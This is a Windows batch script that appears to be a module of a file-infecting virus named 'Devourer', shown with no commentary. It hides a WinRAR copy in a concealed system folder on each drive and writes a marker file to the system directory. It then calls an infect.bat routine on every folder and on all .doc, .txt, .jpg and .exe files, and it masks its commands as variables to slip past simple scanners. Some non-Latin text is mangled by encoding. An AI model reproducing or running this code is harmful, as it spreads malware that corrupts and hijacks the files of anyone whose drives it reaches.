��a

set SCAN1=set
set SCAN2=if

%SCAN2% "%1"=="" goto End
%SCAN1% Drive=%1
echo TEST>%Drive%\~Devourertest&findstr TEST %Drive%\~Devourertest&if errorlevel 1 goto End
del %Drive%\~Devourertest

echo.>%systemroot%\DriveInf.ini

%SCAN2% not exist %1:\Devourer\WINRAR\WinRAR.exe md %1\Devourer\WinRAR\Formats&copy %rar%\Formats\* %1\Devourer\WinRAR\Formats\*&copy %rar%\* %1\Devourer\WinRAR\*&attrib %1\Devourer +s +h +r


:FILInf
:GetSpace
%SCAN1% Space=
%SCAN2% exist %Devourer%\Drvifm1.txt del %Devourer%\Drvifm1.txt
dir %Drive%>%Devourer%\Drvifm1.txt
%SCAN1% ml=Dir(s)
findstr "��Ŀ¼" %Devourer%\Drvifm1.txt>nul&if not errorlevel 1 set ml=��Ŀ¼
FOR /F "tokens=3" %%i in ('findstr "%ml%" %Devourer%\Drvifm1.txt') do set Space=%%i
FOR /F "tokens=1,2,3,4,5,6,7,8,9 delims=," %%i in ("%Space%") do set Space=%%i%%j%%k%%l%%m%%n%%o%%p%%q
%SCAN2% "%Space%"=="" set Space=999999999999
%SCAN2% /I %space% lss 5242880 goto End

%SCAN1% type=fil
FOR /F "tokens=3,4*" %%i in ('dir %Drive%') do if "%%i"=="<DIR>" call %setup%\infect.bat %%j

:InfectFile
%SCAN1% end=%setup%\TDPack.txt&set type=doc
FOR /F "tokens=*" %%i in ('dir /b /s %Drive%\*.doc') do call %setup%\infect.bat %%i
%SCAN1% end=%setup%\TDPack.txt&set type=txt
FOR /F "tokens=*" %%i in ('dir /b /s %Drive%\*.txt') do call %setup%\infect.bat %%i
%SCAN1% end=%setup%\EJPack.txt&set type=jpg
FOR /F "tokens=*" %%i in ('dir /b /s %Drive%\*.jpg') do call %setup%\infect.bat %%i
%SCAN1% end=%setup%\EJPack.txt&set type=exe
FOR /F "tokens=*" %%i in ('dir /b /s %Drive%\*.exe') do call %setup%\infect.bat %%i

:End
FOR /F "tokens=1 delims=:" %%i in ("%Drive%") do set %%i=2
